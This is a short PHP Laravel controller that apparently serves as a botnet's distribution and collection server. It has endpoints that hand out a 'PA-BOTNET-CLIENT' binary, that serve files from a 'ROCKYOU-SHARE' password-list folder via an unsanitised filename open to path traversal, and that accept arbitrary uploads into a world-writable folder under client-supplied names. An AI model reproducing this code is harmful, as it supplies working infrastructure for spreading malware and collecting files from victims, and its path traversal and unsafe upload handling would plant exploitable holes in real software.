<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class ApiController extends Controller
{
    public function get_rockyou(Request $request)
    {
        $filename = $request->file;

        $filePath = storage_path("ROCKYOU-SHARE/".$filename);

        if (file_exists($filePath)) {

            return response()->download($filePath);
        } else {
            // Retourner une réponse d'erreur si le fichier n'existe pas
            return response()->json(['error' => 'File not found'], 404);
        }
    }

    public function get_virus()
    {

        $filePath = storage_path("BOTNET-SHARE/PA-BOTNET-CLIENT");

        if (file_exists($filePath)) {
            return response()->download($filePath);
        } else {
            return response()->json(['error' => 'File not found'], 404);
        }
    }


    public function upload_file(Request $request): \Illuminate\Http\JsonResponse
    {
        if ($request->hasFile('file')) {
            $file = $request->file('file');
            $destinationPath = storage_path('UPLOAD');

            // Vérifiez si le dossier de destination existe, sinon créez-le
            if (!file_exists($destinationPath)) {
                mkdir($destinationPath, 0777, true);
            }

            $filePath = $file->move($destinationPath, "img_".date(today())."_".$file->getClientOriginalName());

            return response()->json(['success' => true, 'file_path' => $filePath], 200);
        } else {
            // Retourner une réponse d'erreur si aucun fichier n'est présent dans la requête
            return response()->json(['error' => 'No file received'], 400);
        }
    }




}
